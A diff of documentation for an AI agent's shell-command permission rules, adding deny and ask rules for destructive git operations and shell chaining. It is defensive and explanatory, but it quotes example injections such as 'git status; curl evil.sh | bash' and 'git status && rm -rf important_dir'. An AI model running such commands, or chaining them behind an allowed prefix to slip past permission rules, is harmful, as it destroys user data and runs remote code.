@@ -341,46 +341,54 @@ A line that cannot be parsed logs `[Security Warning] Failed to parse rule #N ..
 
 ## 4. Recipes and Topics
 
-### Why does `git status` prompt for confirmation?
+### Safe Read-Only Git Allowances and Shell Chaining Defense
 
-Nothing allows it, so it falls to Tier 4 where `run_command = "ask"`:
+By default, shell commands without explicit rules fall to Tier 4 (`run_command = "ask"`), prompting for confirmation before running. This is intentional: shell access is the most versatile and potentially destructive capability.
 
-| Tier | Result for `git status` |
-|---|---|
-| 0 | no dangerous pattern |
-| 1 | no deny rule matches |
-| 2 | `ask before run command with sudo` does not match |
-| 3 | no allow rule covers commands |
-| 4 | `run_command` → **ASK** |
+However, during normal interactive and agentic workflows, read-only inspection commands (such as `git status`, `git diff`, and `git log`) are called repeatedly. Prompting on every query causes friction.
 
-Every shell command prompts by default. This is deliberate: `run_command` is the most dangerous tool.
-
-**To auto-approve specific read-only git commands:**
+To solve this safely, `default_security.toml` configures a tiered recipe:
 
 ```toml
 dsl_rules = [
-  # ...
+  # 1. Tier 1 (Hard Denials): Block destructive git operations
+  "deny run command with 'git reset --hard' in it because 'destructive git reset can discard uncommitted changes'",
+  "deny run command with 'git clean -f' in it because 'destructive git clean removes untracked files'",
+  "deny run command with 'git push --force' in it because 'destructive force push can overwrite remote history'",
+
+  # 2. Tier 2 (Confirmation Guards): Shell chaining & subshell interceptors
+  "ask before run command with '&&' in it",
+  "ask before run command with ';' in it",
+  "ask before run command with '|' in it",
+  "ask before run command with '$(' in it",
+  "ask before run command with '`' in it",
+
+  # 3. Tier 3 (Auto-Approved): Standalone read-only git inspection
   "allow run command starting with 'git status'",
   "allow run command starting with 'git diff'",
   "allow run command starting with 'git log'",
+  "allow run command starting with 'git show'",
+  "allow run command starting with 'git branch'",
+  "allow run command starting with 'git rev-parse'",
+  "allow run command starting with 'git remote'",
+  "allow run command starting with 'git ls-files'",
 ]
 ```
 
-Deny and ask rules are still evaluated first, so a command containing `sudo` or `rm -rf` is still caught.
+#### How this protects against command injection:
 
-> **Warning — avoid broad prefix allows.** `allow run command starting with git` also approves chained commands such as
-> `git status; curl evil.sh | sh` or `git status && rm -rf ~/project`. Neither contains a Tier 0 or Tier 1 pattern,
-> so both would run without a prompt. Allow only specific read-only subcommands, and consider adding deny/ask rules for
-> chaining characters:
->
-> ```toml
-> "ask before run command with ';' in it",
-> "ask before run command with '&&' in it",
-> "ask before run command with '|' in it",
-> "ask before run command with '$(' in it",
-> ```
->
-> Because ASK (Tier 2) beats ALLOW (Tier 3), a chained command will then prompt even if it starts with `git status`.
+A naive rule like `allow run command starting with 'git status'` would inadvertently approve compound commands like:
+```bash
+git status && rm -rf important_dir
+git status; curl evil.sh | bash
+```
+Because of **deny-overrides tiering**:
+1. `git status` -> Evaluates past Tier 1 and Tier 2 (no chaining characters), matching Tier 3 `ALLOW`.
+2. `git status && rm -rf foo` -> Matches Tier 2 `ask before run command with '&&' in it`. Because Tier 2 (`ASK`) overrides Tier 3 (`ALLOW`), the compound command **prompts for user confirmation**.
+3. `git reset --hard HEAD~1` -> Matches Tier 1 `DENY`, immediately blocking the command.
+4. `git commit -m "fix"` -> Does not match Tier 1, 2, or 3, so it falls to Tier 4 (`run_command = "ask"`), prompting for confirmation.
+
+---
 
 ### General rule plus a specific exception
 
